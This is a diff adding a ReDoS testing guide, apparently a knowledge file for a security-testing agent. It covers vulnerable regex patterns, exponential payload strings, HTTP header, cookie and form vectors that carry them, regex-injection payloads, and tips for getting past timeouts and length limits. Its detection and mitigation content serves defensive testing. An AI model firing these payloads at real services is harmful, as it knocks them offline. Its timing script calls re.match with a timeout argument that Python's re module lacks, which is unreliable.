@@ -1,0 +1,459 @@
+<regex_dos_guide>
+<title>REGULAR EXPRESSION DENIAL OF SERVICE (ReDoS)</title>
+
+<critical>Vulnerable regular expressions can cause catastrophic backtracking, leading to denial of service when processing malicious input. ReDoS attacks exploit exponential time complexity in regex engines to consume CPU resources and freeze applications.</critical>
+
+<scope>
+- ReDoS pattern detection
+- Catastrophic backtracking payloads
+- Evil regex identification
+- Input length exploitation
+- Regex engine differences
+- Server-side regex injection
+</scope>
+
+<methodology>
+1. Identify regex patterns used in the application.
+2. Analyze patterns for nested quantifiers and overlapping groups.
+3. Generate payloads that trigger exponential backtracking.
+4. Test input length limits and timeout configurations.
+5. Measure response time increases with payload length.
+</methodology>
+
+<vulnerable_patterns>
+<evil_regex_patterns>
+{% raw %}
+# Evil regex pattern structures:
+
+# 1. Nested quantifiers:
+(a+)+$         # Vulnerable to "aaaaaaaaaaaaaaaaaaaab"
+(a*)*$         # Vulnerable to "aaaaaaaaaaaaaaaaaaaaX"
+(.*a){x}$      # Vulnerable to "aaaaaaaaaaaaaaaaaaaab"
+
+# 2. Overlapping alternatives:
+(a|aa)+$       # Vulnerable to "aaaaaaaaaaaaaaaaaaaaab"
+(a|a?)+$       # Vulnerable to "aaaaaaaaaaaaaaaaaaaaab"
+(.|\s)*$       # Vulnerable to "a a a a a a a a a a a X"
+
+# 3. Repetition with overlap:
+([a-zA-Z]+)*$  # Vulnerable to long strings with non-letter ending
+(\d+)+$        # Vulnerable to "123456789012345678901X"
+(\w+)*$        # Vulnerable to "aaaaaaaaaaaaaaaaaaaaaa!"
+
+# 4. Greedy vs lazy conflicts:
+(.*?)*$        # Vulnerable to repetitive patterns
+(a+?)+$        # Vulnerable to many 'a' followed by non-'a'
+
+# 5. Complex patterns:
+^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}...
+# Email regex often vulnerable
+{% endraw %}
+</evil_regex_patterns>
+
+<common_vulnerable_regex>
+{% raw %}
+# Real-world vulnerable patterns:
+
+# Email validation:
+^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$
+# Payload: "a"*20 + "@" + "a"*20 + "."
+
+# URL validation:
+^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$
+# Payload: "http://a" + "a"*50 + " "
+
+# HTML stripping:
+<.*?>
+# Payload: "<" + "a"*50 + "<>"
+
+# Whitespace normalization:
+\s+
+# Generally safe, but combined with other patterns...
+
+# Phone number:
+^(\+?\d{1,3}[\s.-]?)?(\(?\d{3}\)?[\s.-]?)?[\d\s.-]{7,10}$
+# Payload: long numeric strings
+
+# IP address:
+^([0-9]{1,3}\.){3}[0-9]{1,3}$
+# Usually safe
+{% endraw %}
+</common_vulnerable_regex>
+</vulnerable_patterns>
+
+<payload_generation>
+<exponential_payloads>
+{% raw %}
+# Payload generation strategies:
+
+# For (a+)+$ pattern:
+# Start small, double each time
+"a" * 10 + "b"   # ~0.001s
+"a" * 15 + "b"   # ~0.01s
+"a" * 20 + "b"   # ~0.1s
+"a" * 25 + "b"   # ~1s
+"a" * 30 + "b"   # ~10s
+"a" * 35 + "b"   # ~100s
+
+# For (.*a){n}$ pattern:
+"a" * n + "b"    # Triggers n levels of backtracking
+
+# For email regex:
+username = "a" * 50
+domain = "a" * 50
+payload = f"{username}@{domain}!"
+
+# For nested groups:
+# Pattern: (([a-z]+)([0-9]+))+$
+payload = "a1" * 20 + "!"
+
+# Progressive testing script:
+for length in [10, 15, 20, 25, 30]:
+    payload = "a" * length + "X"
+    start = time.time()
+    regex.match(payload)
+    print(f"Length {length}: {time.time() - start}s")
+{% endraw %}
+</exponential_payloads>
+
+<polynomial_payloads>
+{% raw %}
+# Polynomial time complexity payloads:
+
+# O(n²) patterns:
+# Pattern: .*.*$ 
+payload = "a" * 10000
+
+# O(n³) patterns:
+# Pattern: .*.*.*$
+payload = "a" * 1000
+
+# For partial matching:
+# If regex searches (not anchored)
+# Complexity multiplied by input length
+
+# String search patterns:
+# Pattern: .*needle.*
+payload = "hay" * 10000 + "needl"
+# Backtracking on near-matches
+{% endraw %}
+</polynomial_payloads>
+</payload_generation>
+
+<detection_techniques>
+<pattern_analysis>
+{% raw %}
+# Identifying vulnerable patterns:
+
+# Static analysis indicators:
+# 1. Nested quantifiers: (+)+, (*)+, (+)*, (*)*
+# 2. Overlapping groups: (a|aa), (a|a?)
+# 3. Greedy + lazy: (.*?)+
+# 4. Long alternations with overlap
+
+# Tools for detection:
+# - safe-regex (npm)
+# - rxxr2 (Python)
+# - regex-static-analysis
+# - ReDoS checker online tools
+
+# Manual inspection:
+# Count group nesting levels
+# Identify overlapping character classes
+# Check for unbounded quantifiers
+
+# Python example:
+import re
+pattern = r"(a+)+"
+# Look for: quantifier after group containing quantifier
+{% endraw %}
+</pattern_analysis>
+
+<timing_analysis>
+{% raw %}
+# Timing-based detection:
+
+import time
+import re
+
+def test_redos(pattern, payload_gen, max_length=35):
+    results = []
+    for length in range(5, max_length, 5):
+        payload = payload_gen(length)
+        start = time.time()
+        try:
+            re.match(pattern, payload, timeout=5)
+        except TimeoutError:
+            print(f"Timeout at length {length}")
+            break
+        elapsed = time.time() - start
+        results.append((length, elapsed))
+        print(f"Length {length}: {elapsed:.4f}s")
+        
+        # Exponential growth detection
+        if len(results) > 1:
+            ratio = results[-1][1] / results[-2][1]
+            if ratio > 10:
+                print("Exponential growth detected!")
+    
+    return results
+
+# Test:
+test_redos(r"(a+)+$", lambda n: "a"*n + "!")
+{% endraw %}
+</timing_analysis>
+</detection_techniques>
+
+<exploitation>
+<input_vectors>
+{% raw %}
+# Common input vectors for ReDoS:
+
+# 1. Form fields:
+POST /api/validate
+{"email": "aaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaaaa!"}
+
+# 2. URL parameters:
+GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaa%20aaaaaaaaaaaaaaaa!
+
+# 3. Headers:
+User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+Referer: http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/aaaaaaa!
+
+# 4. File names:
+Content-Disposition: attachment; filename="aaaaaaaaaaaaaaaa!.txt"
+
+# 5. Request body:
+Content-Type: application/json
+{"data": {"field": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}}
+
+# 6. Cookies:
+Cookie: session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# 7. Path parameters:
+GET /users/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!/profile
+{% endraw %}
+</input_vectors>
+
+<server_impact>
+{% raw %}
+# Impact assessment:
+
+# CPU exhaustion:
+# - Single request can consume 100% CPU
+# - Blocks event loop in Node.js
+# - Starves other requests of resources
+
+# Memory impact:
+# - Backtracking stack growth
+# - Potential stack overflow
+
+# Amplification:
+# - Multiple concurrent requests
+# - Smaller payloads, more requests
+# - Load balancer bypass
+
+# Service degradation:
+# - Response time increase
+# - Request timeouts
+# - Worker process exhaustion
+
+# Monitoring detection:
+# - High CPU usage
+# - Increased latency
+# - Error rate increase
+{% endraw %}
+</server_impact>
+</exploitation>
+
+<regex_injection>
+<injection_vectors>
+{% raw %}
+# Regex injection attacks:
+
+# If user input becomes part of regex:
+search_pattern = user_input  # Dangerous!
+re.search(search_pattern, content)
+
+# Injection payloads:
+# 1. Create ReDoS pattern:
+"(a+)+" + "a"*30 + "!"
+
+# 2. Match everything:
+".*"
+
+# 3. Escape characters:
+"\\" + "a"*100  # May cause parsing issues
+
+# 4. Metacharacter injection:
+"()" * 100  # Group exhaustion
+"(?=" * 50  # Lookahead nesting
+
+# 5. Backreference bomb:
+"(a)\\1\\1\\1\\1\\1"
+
+# 6. Unicode abuse:
+"\x00" * 1000
+{% endraw %}
+</injection_vectors>
+
+<injection_exploitation>
+{% raw %}
+# Exploiting regex injection:
+
+# Data extraction via regex:
+# If regex matches are returned:
+payload = ".{1}a"  # Match characters one by one
+# Enumerate content character by character
+
+# Bypass validation:
+# If regex validates input:
+payload = ".*"  # Match anything
+payload = "^$|valid_pattern"  # Always match
+
+# Time-based extraction:
+# Different payloads cause different delays
+# Infer data from timing
+
+# Error-based extraction:
+# Invalid regex may leak information
+payload = "[invalid"  # Unclosed bracket
+# Error message may reveal context
+{% endraw %}
+</injection_exploitation>
+</regex_injection>
+
+<engine_differences>
+<engine_comparison>
+{% raw %}
+# Regex engine behavior differences:
+
+# NFA (Nondeterministic Finite Automaton):
+# - Python, Java, JavaScript, .NET, Ruby, PHP
+# - Supports backreferences
+# - Vulnerable to backtracking
+
+# DFA (Deterministic Finite Automaton):
+# - RE2 (Google), Rust regex
+# - Linear time complexity
+# - Limited feature set
+
+# Hybrid engines:
+# - Some features use NFA, some DFA
+# - May be partially vulnerable
+
+# Engine-specific exploits:
+# Python re module:
+# - Full NFA, fully vulnerable
+# - No built-in timeout
+
+# JavaScript RegExp:
+# - NFA with optimizations
+# - Vulnerable but may be faster
+
+# Java Pattern:
+# - NFA, supports possessive quantifiers
+# - Possessive: (a++)+ prevents backtracking
+
+# .NET Regex:
+# - NFA with timeout option
+# - Regex.Match(input, pattern, timeout)
+{% endraw %}
+</engine_comparison>
+</engine_differences>
+
+<mitigation_testing>
+<testing_defenses>
+{% raw %}
+# Testing ReDoS mitigations:
+
+# 1. Timeout bypass:
+# If timeout is 5 seconds:
+# - Use multiple requests
+# - Just under timeout payloads
+# - Keep connection open
+
+# 2. Input length limits:
+# If limit is 100 characters:
+# - Payloads may still work at limit
+# - Chain multiple fields
+# - Compression bypass
+
+# 3. Pattern limits:
+# If quantifiers are limited:
+# - Use maximum allowed
+# - Combine with length
+
+# 4. Regex sanitization:
+# Test if user input is escaped
+payload = "(a+)+"  # Should be escaped to \(a\+\)\+
+
+# 5. Alternative engines:
+# Check if RE2 is actually used
+# Feature test: backreferences
+{% endraw %}
+</testing_defenses>
+</mitigation_testing>
+
+<common_payloads>
+{% raw %}
+# Basic ReDoS payloads:
+"a" * 30 + "!"           # For (a+)+$
+"a " * 30 + "!"          # For (\s+)+$
+"0" * 30 + "x"           # For (\d+)+$
+
+# Email validation:
+"a" * 50 + "@" + "a" * 50 + "."
+
+# URL validation:
+"http://a" + "a" * 50 + " "
+
+# HTML tag:
+"<" + "a" * 50 + " " + "a" * 50 + ">"
+
+# Progressive testing:
+for i in range(10, 50, 5):
+    print("a" * i + "!")
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Identify vulnerable regex pattern in application.
+2. Generate payload causing measurable delay increase.
+3. Demonstrate exponential time growth with length.
+4. Show CPU impact on server.
+5. Document specific regex and minimal exploit payload.
+</validation>
+
+<false_positives>
+- Regex with proper timeout configuration
+- Linear-time regex engine (RE2)
+- Input length limits preventing exploitation
+- Patterns without nested quantifiers
+- Anchored patterns with early rejection
+</false_positives>
+
+<impact>
+- Application denial of service
+- CPU resource exhaustion
+- Worker/thread starvation
+- Cascading service failures
+- Increased infrastructure costs
+- User experience degradation
+</impact>
+
+<pro_tips>
+1. Start with small payloads and measure time increase.
+2. Look for nested quantifiers in source code.
+3. Test email and URL validation fields first.
+4. Use timing analysis to detect vulnerable patterns.
+5. Check if application has regex timeout configuration.
+6. Test both anchored and unanchored patterns.
+7. Try regex injection if user input is used in patterns.
+8. Document the time complexity growth for report.
+9. Test multiple input vectors (forms, headers, URLs).
+10. Consider partial match scenarios, not just full match.
+</pro_tips>
+
+<remember>ReDoS is a subtle but powerful attack vector. Even well-tested applications can be vulnerable if regex patterns aren't analyzed for catastrophic backtracking. Always test input validation patterns with progressively longer payloads and measure timing.</remember>
+</regex_dos_guide>
